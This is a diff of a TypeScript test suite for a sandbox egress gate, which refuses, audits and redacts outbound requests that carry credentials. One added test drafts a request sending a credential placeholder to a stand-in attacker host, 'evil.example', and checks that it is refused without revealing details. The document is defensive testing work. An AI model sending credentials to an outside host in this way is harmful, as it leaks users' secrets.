@@ -380,8 +380,30 @@ describe("the egress gate", () => {
 			),
 		);
 		expect(refused.error).toBe("connection_not_usable");
-		// Not telling the session where the connection is bound.
+		// Not telling the session where the connection is bound, nor which it is.
 		expect(refused.message).not.toContain("api.example.com");
+		expect(JSON.stringify(refused)).not.toContain(alice.id);
+		expect(JSON.stringify(refused)).not.toContain(alice.name);
+		// Sent to another host, it tells as little.
+		const elsewhere = refusalOf(
+			await env.connections.egress(
+				SYSTEM,
+				SESSION,
+				draft("https://evil.example/", [["authorization", alice.placeholder!]]),
+			),
+		);
+		expect(elsewhere.error).toBe("connection_not_usable");
+		expect(JSON.stringify(elsewhere)).not.toContain("api.example.com");
+		// Not a use the shared session's viewers read; the audit trail has which connection it was.
+		const uses = await env.connections.listUses(admin, { sessionId: "ses_1" });
+		expect(uses.items.some((use) => use.connectionId === alice.id)).toBe(false);
+		expect(
+			env.events.some(
+				(event) =>
+					event.type === "connections.egress.refused" &&
+					(event.data as { connectionId?: string } | undefined)?.connectionId === alice.id,
+			),
+		).toBe(true);
 		// Private to her, the same request goes out.
 		env.sessions.set("ses_1", record({ userId: "alice", visibility: "private" }));
 		const sent = await env.connections.egress(
@@ -442,6 +464,11 @@ describe("the egress gate", () => {
 			const changed = { ...post, headers: [...post.headers, extra] };
 			expect(refusalOf(await env.connections.egress(SYSTEM, SESSION, changed)).error).toBe("approval_pending");
 		}
+		// Nor the same body with a byte-order mark before it: other bytes on the wire.
+		const marked = { ...post, body: new Uint8Array([0xef, 0xbb, 0xbf, ...post.body!]) };
+		const markedPending = refusalOf(await env.connections.egress(SYSTEM, SESSION, marked));
+		expect(markedPending.error).toBe("approval_pending");
+		expect(markedPending.digest).not.toBe(pending.digest);
 		expect(env.sent).toHaveLength(0);
 		const sent = await env.connections.egress(SYSTEM, SESSION, post);
 		expect(sent.kind).toBe("sent");
@@ -582,5 +609,34 @@ describe("the gate's pure parts", () => {
 		const clean = redactBytes(bytes, [KEY]);
 		expect(clean.count).toBe(1);
 		expect(Array.from(clean.bytes)).toEqual([0xff, ...new TextEncoder().encode("[redacted]"), 0x00]);
+	});
+
+	it("cuts a credential's start out of a body cut short partway through it", () => {
+		const cut = new TextEncoder().encode(`ok ${KEY.slice(0, 12)}`);
+		expect(new TextDecoder().decode(redactBytes(cut, [KEY], { truncated: true }).bytes)).toBe("ok [redacted]");
+		// Not cut short, the same bytes are no credential and stay.
+		expect(redactBytes(cut, [KEY]).bytes).toBe(cut);
+		// A whole credential ending the body is cut whole, even one whose end repeats its start.
+		const echo = "abcdefgh-abcd";
+		const whole = redactBytes(new TextEncoder().encode(`x ${echo}`), [echo], { truncated: true });
+		expect(new TextDecoder().decode(whole.bytes)).toBe("x [redacted]");
+	});
+
+	it("cuts a credential's start at the 10 MiB limit out of what the sandbox gets", async () => {
+		const padding = 10 * 1024 * 1024 - 10;
+		const env = setup({
+			answer: () =>
+				new Response(new Uint8Array([...new Uint8Array(padding).fill(0x61), ...new TextEncoder().encode(KEY)])),
+		});
+		const connection = await env.connect();
+		const sent = await env.connections.egress(
+			SYSTEM,
+			SESSION,
+			draft("https://api.example.com/v1", [["authorization", connection.placeholder!]]),
+		);
+		if (sent.kind !== "sent") throw new Error(`not sent: ${sent.kind}`);
+		const tail = new TextDecoder().decode(sent.body.subarray(padding - 2));
+		expect(tail).toBe("aa[redacted]");
+		expect(tail).not.toContain(KEY.slice(0, 10));
 	});
 });
